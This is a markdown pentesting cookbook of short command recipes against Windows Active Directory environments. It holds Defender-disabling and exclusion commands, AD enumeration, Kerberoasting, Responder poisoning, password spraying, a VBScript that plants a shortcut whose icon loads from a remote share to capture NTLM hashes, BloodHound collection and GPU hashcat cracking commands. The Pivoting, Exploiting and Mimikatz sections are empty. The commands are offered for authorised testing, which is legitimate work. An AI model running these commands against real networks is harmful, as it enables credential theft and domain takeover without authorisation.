# A Pentesting Cookbook
A collection of brief recepies for pentesting

## Tools
### Kali Linux
https://www.kali.org/get-kali/
### CrackMapExec (CME)
https://mpgn.gitbook.io/crackmapexec/
### Responder 
https://github.com/lgandx/Responder
### Impacket
https://github.com/SecureAuthCorp/impacket
### Bloodhound
https://github.com/BloodHoundAD/BloodHound
### Mimikatz
https://github.com/gentilkiwi/mimikatz/wiki

## Preparations

### Prepare a Windows 10 test machine
Run the below in powershell with admin permissions on a fresh install of Windows 10

```powershell

Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
choco install sql-server-2019 -y
choco install sql-server-management-studio -y
choco install vscode -y
choco install googlechrome -y
choco install firefox -y
choco install visualstudio2019community -y
choco install github-desktop -y

```

#### Disable Defender Antivirus
Although Microsoft Defender offers a command to disable the antivirus, it's guarded by the Tamper Protection feature, which you can only disable through the Virus & threat protection settings available in the Windows Security app.

Run as admin in powershell 

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

#### Exclude path from Defender Antivirus
Run as admin in powershell 

```powershell
Set-MpPreference -ExclusionPath PATH\TO\FOLDER
```

#### Disable archive scanning in Defender Antivirus
By default, the antivirus scans .zip, .cab, and other archive files, but if you have a reason not to scan archives, you can disable the option with these steps:
Run as admin in powershell 
```powershell
Set-MpPreference -DisableArchiveScanning $true
```

## Recon

### Sniffing
#### Run tcpdump to capture all packets except DNS 

```bash
tcpdump -n -s0 -i eth0 -w [FILENAME].pcap
```

### Enumeration
#### Get all Active Directory Users
##### Kali (Linux)
Using impacket
```bash
GetADUsers.py -all <domain\User> -dc-ip <DC_IP>
```
##### Windows
```cmd
net user /domain
```

#### Get all Active Directory Groups
##### Kali (Linux)
##### Windows
```cmd
net group /domain
```

#### Get all members of Domain Administrators
##### Windows
```cmd
net group “Domain Administrators” /domain
```

#### Dump domain info via LDAP
##### Kali (Linux)
```bash
ldapdomaindump -u 'domain\user' -p 'PASS' -d '#' [DC FQDN]
```

## Credentials
The following techniques can be used to harvest credentials

### Kerberoasting

```bash
impacket-GetUserSPNs -request -dc-ip [Domain Controller IP] -outputfile KerberoastingOut.txt [DOMAIN/UserName]
```

### Responder
Run built-in responder in Kali Linux
```bash
responder -I eth0 -v
```

Parse output
```bash
./DumpHash.py
```

### Password spraying
Use Crackmapexec to test one password for multiple users
```bash
crackmapexec smb 192.168.1.101 -u users.txt -p [password] --continue-on-success
```
ref: https://mpgn.gitbook.io/crackmapexec/smb-protocol/password-spraying

### Create link file

Create a vbscript file with the following content and run the script to create a link file on the current desktop.
```vbscript
set WshShell = WScript.CreateObject("WScript.Shell")
strDesktop = WshShell.SpecialFolders("Desktop")
set oShellLink = WshShell.CreateShortcut(strDesktop & "\Support.lnk")
oShellLink.TargetPath = WScript.ScriptFullName
oShellLink.WindowStyle = 1
oShellLink.Hotkey = ""
oShellLink.IconLocation = "\\[IP address]\support\support.ico, 0"  'Zero is the index
oShellLink.Description = "Support"
oShellLink.WorkingDirectory = strDesktop
oShellLink.Save
```

### Bloodhound
```powershell
.\SharpHound.exe -c all
```

### Mimikatz


## Passwords

1. Create a g4dn.xlarge instance with the  [Deep Learning AMI (Ubuntu 18.04)](https://docs.aws.amazon.com/dlami/latest/devguide/ubuntu18-04.html) on AWS
2. Log on to the instance and prepare for cracking:

```bash
git clone https://github.com/jonasonline/cracking-instance && cd cracking-instance && sudo chmod +x PreparePwdCrack.sh && ./PreparePwdCrack.sh
```
3. Create and start a nvidia docker container using **one** of the commands below
 * **Kerberoasting tickets**
 ```bash
 nvidia-docker run --rm -t -d -v /var/tmp/pwds:/var/tmp/pwds jonasonline/nvidiahashcat:latest hashcat -a 0 -m 13100 /var/tmp/pwds/input/[hash_file] /var/tmp/pwds/wordlists/[wordlist_file] -o /var/tmp/pwds/output/result.txt -O -r /var/tmp/pwds/rules/password_cracking_rules/OneRuleToRuleThemAll.rule 
 ```

 * **NTLM hashes**
 ```bash
 nvidia-docker run --rm -t -d -v /var/tmp/pwds:/var/tmp/pwds jonasonline/nvidiahashcat:latest hashcat -a 0 -m 1000 /var/tmp/pwds/input/[hash_file] /var/tmp/pwds/wordlists/[wordlist_file] -o /var/tmp/pwds/output/result.txt -O -r /var/tmp/pwds/rules/password_cracking_rules/OneRuleToRuleThemAll.rule 
 ```

 * **NetNTLMv2 hashes**
 ```bash
 nvidia-docker run --rm -t -d -v /var/tmp/pwds:/var/tmp/pwds jonasonline/nvidiahashcat:latest hashcat -a 0 -m 5600 /var/tmp/pwds/input/[hash_file] /var/tmp/pwds/wordlists/[wordlist_file] -o /var/tmp/pwds/output/result.txt -O -r /var/tmp/pwds/rules/password_cracking_rules/OneRuleToRuleThemAll.rule 
 ```

## Pivoting

## Exploiting